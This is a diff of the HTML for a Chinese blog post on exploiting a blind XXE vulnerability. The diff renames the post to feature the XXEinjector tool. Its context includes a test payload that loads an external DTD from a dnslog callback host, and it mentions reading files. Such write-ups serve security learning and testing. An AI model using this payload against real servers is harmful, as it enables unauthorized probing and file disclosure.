@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>一个blind XXE漏洞利用分析 | xd_xd&#39;s blog</title>
+    <title>一个blind XXE漏洞利用工具XXEinjector | xd_xd&#39;s blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="xd_xd">
@@ -12,27 +12,27 @@
 
     
     <meta name="description" content="参考资料关于Blind XXE你所不知道的XML安全未知攻焉知防——XXE漏洞攻防XXE漏洞以及Blind XXE总结
-漏洞探测使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
+漏洞探测关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
 测试payload:
-&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE convert [ &amp;">
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="一个blind XXE漏洞利用分析">
+<meta property="og:title" content="一个blind XXE漏洞利用工具XXEinjector">
 <meta property="og:url" content="http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
 <meta property="og:description" content="参考资料关于Blind XXE你所不知道的XML安全未知攻焉知防——XXE漏洞攻防XXE漏洞以及Blind XXE总结
-漏洞探测使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
+漏洞探测关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
 测试payload:
-&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE convert [ &amp;">
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF">
 <meta property="og:image" content="http://xdxd.love/images/onexxe1.png">
 <meta property="og:image" content="http://xdxd.love/images/onexxe3.png">
 <meta property="og:image" content="http://xdxd.love/images/onexxe2.png">
-<meta property="og:updated_time" content="2016-09-08T07:12:55.000Z">
+<meta property="og:updated_time" content="2016-09-08T07:34:55.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="一个blind XXE漏洞利用分析">
+<meta name="twitter:title" content="一个blind XXE漏洞利用工具XXEinjector">
 <meta name="twitter:description" content="参考资料关于Blind XXE你所不知道的XML安全未知攻焉知防——XXE漏洞攻防XXE漏洞以及Blind XXE总结
-漏洞探测使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
+漏洞探测关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。
 测试payload:
-&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;&amp;lt;!DOCTYPE convert [ &amp;">
+&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -92,7 +92,7 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2016/09/08/一个blind-XXE漏洞利用分析/" title="一个blind XXE漏洞利用分析" itemprop="url">一个blind XXE漏洞利用分析</a>
+      <a href="/2016/09/08/一个blind-XXE漏洞利用分析/" title="一个blind XXE漏洞利用工具XXEinjector" itemprop="url">一个blind XXE漏洞利用工具XXEinjector</a>
   </h1>
   <p class="article-author">By
        
@@ -113,7 +113,7 @@
 		</div>
 		
 		<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a></p>
-<h2 id="漏洞探测">漏洞探测</h2><p>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
+<h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
 <p>测试payload:</p>
 <pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
 </code></pre><h2 id="文件读取">文件读取</h2><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
@@ -152,7 +152,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/" data-title="一个blind XXE漏洞利用分析 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/" data-title="一个blind XXE漏洞利用工具XXEinjector | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -178,7 +178,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2016/09/08/一个blind-XXE漏洞利用分析/" data-title="一个blind XXE漏洞利用分析" data-url="http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/"></div>
+	<div class="ds-thread" data-thread-key="2016/09/08/一个blind-XXE漏洞利用分析/" data-title="一个blind XXE漏洞利用工具XXEinjector" data-url="http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/"></div>
 </section>
 
 
